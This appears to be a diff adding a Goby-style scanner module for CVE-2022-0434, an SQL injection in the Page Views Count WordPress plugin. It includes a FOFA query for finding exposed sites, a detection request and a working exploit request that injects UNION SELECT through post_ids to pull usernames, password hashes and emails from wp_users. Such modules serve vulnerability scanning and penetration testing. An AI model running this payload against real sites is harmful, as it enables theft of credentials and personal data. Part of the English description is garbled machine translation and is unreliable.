@@ -1,0 +1,151 @@
+{
+  "Name": "WordPress PageViewsCount Plugin SQL Injection",
+  "Description": "<p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">Page Views Count WordPress Plugin</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">是一个设置简单易行的插件，使网站访问者和网站所</span><span style=\"color: rgb(34, 34, 34); font-size: 12.0059pt;\">有者能够快速轻松地查看有多少人访问过该页面或帖子。</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">Page Views Count WordPress Plugin v2.4.15</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">之前的版本中存在</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">SQL</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">注入漏洞，该漏洞允许</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">攻击者通过</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">post_ids</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">参数执行任意</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">SQL</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">代码。</span></p>",
+  "Product": "WordPress",
+  "Homepage": "https://fofa.so/",
+  "DisclosureDate": "2022-04-03",
+  "Author": "大C",
+  "FofaQuery": "body=\"/wp-content/plugins//page-views-count/\"",
+  "GobyQuery": "body=\"/wp-content/plugins//page-views-count/\"",
+  "Level": "3",
+  "Impact": "<p>1、攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。</p><p>2、可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。</p><p>3、如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。</p><p>4、<span style=\"color: var(--primaryFont-color);\">经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。</span></p>",
+  "Recommendation": "<p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">升级版本，补丁链接</span></p><p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\"><a href=\"https://downloads.wordpress.org/plugin/page-views-count.2.4.15.zip\">https://downloads.wordpress.org/plugin/page-views-count.2.4.15.zip</a>&nbsp;</span></p>",
+  "References": [
+    "https://fofa.so/"
+  ],
+  "Is0day": false,
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "sql",
+      "type": "select",
+      "value": "user_name,user_pass,user_email",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/?rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5(1423),md5(1423),md5(1423)%20from%20wp_users%20--%20g",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "856fc81623da2150ba2210ba1b51d241",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/?rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20{{{sql}}},1,1%20from%20wp_users%20--%20g",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "success",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "output|lastbody|regex|(?s)(.*)"
+      ]
+    }
+  ],
+  "Tags": [
+    "SQL Injection"
+  ],
+  "VulType": [
+    "SQL Injection"
+  ],
+  "CVEIDs": [
+    "CVE-2022-0434"
+  ],
+  "CNNVD": [
+    "CNNVD-202203-601"
+  ],
+  "CNVD": [
+    ""
+  ],
+  "CVSSScore": "9.8",
+  "Translation": {
+    "CN": {
+      "Name": "WordPress PageViewsCount访问统计插件rest_route参数SQL注入漏洞",
+      "Product": "WordPress",
+      "Description": "<p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">Page Views Count WordPress Plugin</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">是一个设置简单易行的插件，使网站访问者和网站所</span><span style=\"color: rgb(34, 34, 34); font-size: 12.0059pt;\">有者能够快速轻松地查看有多少人访问过该页面或帖子。</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">Page Views Count WordPress Plugin v2.4.15</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">之前的版本中存在</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">SQL</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">注入漏洞，该漏洞允许</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">攻击者通过</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">post_ids</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">参数执行任意</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">SQL</span><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">代码。</span></p>",
+      "Recommendation": "<p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">升级版本，补丁链接</span></p><p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\"><a href=\"https://downloads.wordpress.org/plugin/page-views-count.2.4.15.zip\">https://downloads.wordpress.org/plugin/page-views-count.2.4.15.zip</a>&nbsp;</span></p>",
+      "Impact": "<p>1、攻击者未经授权可以访问数据库中的数据，盗取用户的隐私以及个人信息，造成用户的信息泄露。</p><p>2、可以对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号。</p><p>3、如果网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等。</p><p>4、<span style=\"color: var(--primaryFont-color);\">经过提权等步骤，服务器最高权限被攻击者获取。攻击者可以远程控制服务器，安装后门，得以修改或控制操作系统。</span></p>",
+      "VulType": [
+        "SQL 注⼊"
+      ],
+      "Tags": [
+        "SQL 注⼊"
+      ]
+    },
+    "EN": {
+      "Name": "Page Views Count WordPress Plugin SQL Injection",
+      "Product": "WordPress ",
+      "Description": "<p>Page views count WordPress plugin is an easy to set-up plug-in that enables website visitors and website owners to quickly and easily see how many people have visited the page or post. Page Views Count WordPress Plugin v2. SQL injection vulnerability in versions prior to 4.15 allows attackers to inject SQL via post_ The IDS parameter executes arbitrary SQL code.<br></p>",
+      "Recommendation": "<p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\">Upgrade version, patch link</span></p><p><span style=\"font-size: 12.0059pt; color: rgb(34, 34, 34);\"><a href=\"https://downloads.wordpress.org/plugin/page-views-count.2.4.15.zip\">https://downloads.wordpress.org/plugin/page-views-count.2.4.15.zip</a>&nbsp;</span></p>",
+      "Impact": "<p>1. The attacker can access the data in the database without authorization, steal the user's privacy and personal information, and cause the user's information disclosure.</p><p>2. You can add or delete data in the database, such as adding or deleting administrator accounts without permission.</p><p>3. If the website directory has write permission, it can be written to the web Trojan horse. The attacker can then tamper with the web page and publish some illegal information.</p><p>4. After steps such as raising the right, the highest authority of the server was obtained by the attacker. Attackers can remotely control the server and install backdoors to modify or control the operating system.</p>",
+      "VulType": [
+        "SQL Injection"
+      ],
+      "Tags": [
+        "SQL Injection"
+      ]
+    }
+  },
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
